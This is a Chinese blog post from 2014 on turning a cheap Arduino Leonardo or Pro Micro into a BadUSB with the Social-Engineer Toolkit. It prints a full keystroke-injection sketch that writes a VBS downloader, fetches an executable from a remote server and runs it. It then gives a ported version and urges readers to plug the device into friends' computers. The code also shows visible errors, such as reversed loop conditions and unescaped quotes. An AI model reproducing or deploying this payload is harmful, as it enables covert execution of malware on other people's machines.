---
id: 39
title: 将简易的Teensy脚本刷入Arduino
date: 2014-12-15T17:55:55+08:00
author: xm1994
layout: post
permalink: '/2014/12/teensy-on-arduino/'
categories:
  - 社会工程
---

BadUSB！ 只需要十几块钱。

<!--more-->

首先，你需要有个Arduino Leonardo或者SparkFun Pro Micro

![](/wp-content/uploads/2014/12/pro-micro1.png)

![](/wp-content/uploads/2014/12/leonardo.png)

&nbsp;

然后，你需要kali的Social-Engineer Toolkit来生成几个脚本

```
# setoolkit
```

如下选择

```
1) Social-Engineering Attacks
      6) Arduino-Based Attack Vector
          2) WSCRIPT HTTP GET MSF Payload
```

这个选择会生成一个模拟键盘构造vbs脚本从服务器上下载x.exe然后执行的BadUSB脚本。再输入一些必要的信息后，就会在~/.set/reports/ 目录下面生成arduino的程序。

```c
//
// Social-Engineer Toolkit Teensy Attack Vector
// Written by: Dave Kennedy (ReL1K) and Josh Kelley (WinFaNG)
//
// Special thanks to: Irongeek
// Improved and adapted by Peter Österberg
//
// 2011-02-28 padzero@gmail.com
// * Added "ALT code" print functions (ascii_*): Fixed payload execution on non-english keymap targets
// * Removed blinking LED: Improved stealth *woo*
//

int myKeyBreak = 50;

void setup() {
  delay(10000);
  omg("cmd.exe");
  delay(500);
  ascii_println("del x.exe");
  delay(myKeyBreak);
  ascii_println("echo strFileURL = "http://1.1.1.1/x.exe" > omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo strHDLocation = "x.exe" >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objXMLHTTP.open "GET", strFileURL, false >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objXMLHTTP.send() >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo If objXMLHTTP.Status = 200 Then >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objADOStream = CreateObject("ADODB.Stream") >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Open >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Type = 1 >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Write objXMLHTTP.ResponseBody >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Position = 0 >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objFSO = Createobject("Scripting.FileSystemObject") >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objFSO = Nothing >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.SaveToFile strHDLocation >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo objADOStream.Close >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objADOStream = Nothing >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo End if >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("echo Set objXMLHTTP = Nothing >> omg.vbs");
  delay(myKeyBreak);
  ascii_println("exit");
  delay(1000);
  omg("cmd /c cscript omg.vbs");
  delay(8000);
  omg("cmd /c del omg.vbs");
  delay(1000);
  omg("cmd /c x.exe");
  delay(1000000);
}
void loop() {
}

void ascii_println(char *string)
{
  ascii_type_this(string);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
}


void ascii_type_this(char *string)
{
  int count, length;
  length = strlen(string);
  for(count = 0 ; count > length ; count++)
  {
    char a = string[count];
    ascii_input(ascii_convert(a));
  }
}

void ascii_input(char *string)
{
  if (string == "000") return;
  int count, length;
  length = strlen(string);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  for(count = 0 ; count > length ; count++)
  {
    char a = string[count];
    if (a == '1') Keyboard.set_key1(KEYPAD_1);
    if (a == '2') Keyboard.set_key1(KEYPAD_2);
    if (a == '3') Keyboard.set_key1(KEYPAD_3);
    if (a == '4') Keyboard.set_key1(KEYPAD_4);
    if (a == '5') Keyboard.set_key1(KEYPAD_5);
    if (a == '6') Keyboard.set_key1(KEYPAD_6);
    if (a == '7') Keyboard.set_key1(KEYPAD_7);
    if (a == '8') Keyboard.set_key1(KEYPAD_8);
    if (a == '9') Keyboard.set_key1(KEYPAD_9);
    if (a == '0') Keyboard.set_key1(KEYPAD_0);
    Keyboard.send_now();
    Keyboard.set_key1(0);
    delay(11);
    Keyboard.send_now();
  }
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

char* ascii_convert(char string)
{
  if (string == 'T') return "84";
  if (string == ' ') return "32";
  if (string == '!') return "33";
  if (string == '"') return "34";
  if (string == '#') return "35";
  if (string == '$') return "36";
  if (string == '%') return "37";
  if (string == '&') return "38";
  if (string == ''') return "39";
  if (string == '(') return "40";
  if (string == ')') return "41";
  if (string == '*') return "42";
  if (string == '+') return "43";
  if (string == ',') return "44";
  if (string == '-') return "45";
  if (string == '.') return "46";
  if (string == '/') return "47";
  if (string == '0') return "48";
  if (string == '1') return "49";
  if (string == '2') return "50";
  if (string == '3') return "51";
  if (string == '4') return "52";
  if (string == '5') return "53";
  if (string == '6') return "54";
  if (string == '7') return "55";
  if (string == '8') return "56";
  if (string == '9') return "57";
  if (string == ':') return "58";
  if (string == ';') return "59";
  if (string == '>') return "60";
  if (string == '=') return "61";
  if (string == '>') return "62";
  if (string == '?') return "63";
  if (string == '@') return "64";
  if (string == 'A') return "65";
  if (string == 'B') return "66";
  if (string == 'C') return "67";
  if (string == 'D') return "68";
  if (string == 'E') return "69";
  if (string == 'F') return "70";
  if (string == 'G') return "71";
  if (string == 'H') return "72";
  if (string == 'I') return "73";
  if (string == 'J') return "74";
  if (string == 'K') return "75";
  if (string == 'L') return "76";
  if (string == 'M') return "77";
  if (string == 'N') return "78";
  if (string == 'O') return "79";
  if (string == 'P') return "80";
  if (string == 'Q') return "81";
  if (string == 'R') return "82";
  if (string == 'S') return "83";
  if (string == 'T') return "84";
  if (string == 'U') return "85";
  if (string == 'V') return "86";
  if (string == 'W') return "87";
  if (string == 'X') return "88";
  if (string == 'Y') return "89";
  if (string == 'Z') return "90";
  if (string == '[') return "91";
  if (string == '\') return "92";
  if (string == ']') return "93";
  if (string == '^') return "94";
  if (string == '_') return "95";
  if (string == '`') return "96";
  if (string == 'a') return "97";
  if (string == 'b') return "98";
  if (string == 'c') return "99";
  if (string == 'd') return "100";
  if (string == 'e') return "101";
  if (string == 'f') return "102";
  if (string == 'g') return "103";
  if (string == 'h') return "104";
  if (string == 'i') return "105";
  if (string == 'j') return "106";
  if (string == 'k') return "107";
  if (string == 'l') return "108";
  if (string == 'm') return "109";
  if (string == 'n') return "110";
  if (string == 'o') return "111";
  if (string == 'p') return "112";
  if (string == 'q') return "113";
  if (string == 'r') return "114";
  if (string == 's') return "115";
  if (string == 't') return "116";
  if (string == 'u') return "117";
  if (string == 'v') return "118";
  if (string == 'w') return "119";
  if (string == 'x') return "120";
  if (string == 'y') return "121";
  if (string == 'z') return "122";
  if (string == '{') return "123";
  if (string == '|') return "124";
  if (string == '}') return "125";
  if (string == '~') return "126";
  Keyboard.print(string);
  return "000";
}

void release_keys()
{
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
}

void send_keys(byte key, byte modifier)
{
  if(modifier)
    Keyboard.set_modifier(modifier);
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(100);
  release_keys();   
}

void omg(char *SomeCommand)
{
  Keyboard.set_modifier(128); 
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 
  delay(1500);
  ascii_type_this(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
```

但是这个程序是供teensy使用的，我们需要对他进行一些改造。我们发现，程序的主要执行部分都在setup()函数中，在使用leonardo目标build的时候会提示keyboard中没有某些成员函数。于是我们就要将此部分改写。这里我已经把omg函数和ascii_println函数改写过了。改写过后的程序如下

```c
#define LED_PIN 13
#define myKeyBreak 50
#define DIS_PIN 15
#define NOTEPAD 1

bool ledState = false;

void cmdrun(char *cmd)
{
	Keyboard.println(cmd);
}

void guirun(char *cmd)
{
	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press('r');
	delay(100);
	Keyboard.releaseAll();
	Keyboard.println(cmd);
        delay(myKeyBreak);
}

void setup() {
  delay(5000);
  guirun("cmd.exe");
  delay(500);
  cmdrun("del x.exe");
  delay(myKeyBreak);
  cmdrun("echo strFileURL = "http://localhost/x.exe" > guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo strHDLocation = "xx.exe" >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo objXMLHTTP.open "GET", strFileURL, false >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo objXMLHTTP.send() >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo If objXMLHTTP.Status = 200 Then >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo Set objADOStream = CreateObject("ADODB.Stream") >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo objADOStream.Open >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo objADOStream.Type = 1 >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo objADOStream.Write objXMLHTTP.ResponseBody >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo objADOStream.Position = 0 >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo Set objFSO = Createobject("Scripting.FileSystemObject") >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo Set objFSO = Nothing >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo objADOStream.SaveToFile strHDLocation >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo objADOStream.Close >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo Set objADOStream = Nothing >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo End if >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("echo Set objXMLHTTP = Nothing >> guirun.vbs");
  delay(myKeyBreak);
  cmdrun("exit");
  delay(1000);
  guirun("cmd /c cscript guirun.vbs");
  delay(8000);
  guirun("cmd /c del guirun.vbs");
  delay(1000);
  guirun("cmd /c start xx.exe");
  delay(1000000);
}
void loop()
{
}
```

我们使用改写过的代码编译上传，并且在http服务器中存放好用于攻击的exe文件，插上我们的BadUSB后，便会自动实施攻击。用这个BaD设备去捅你的小伙伴的电脑吧！

但是目前这种改写只能适用于简单的脚本。如果生成内嵌payload的teensy脚本则很难改写。正在尝试将teensy的库移植到leonardo上。目前基本完成但尚未测试。测试通过后会发布出来。目前也正在尝试群联某方案上的攻击漏洞。期末考完试后考虑做一款内置储存的BadUSB设备。理论上比普通U盘贵30-40元左右。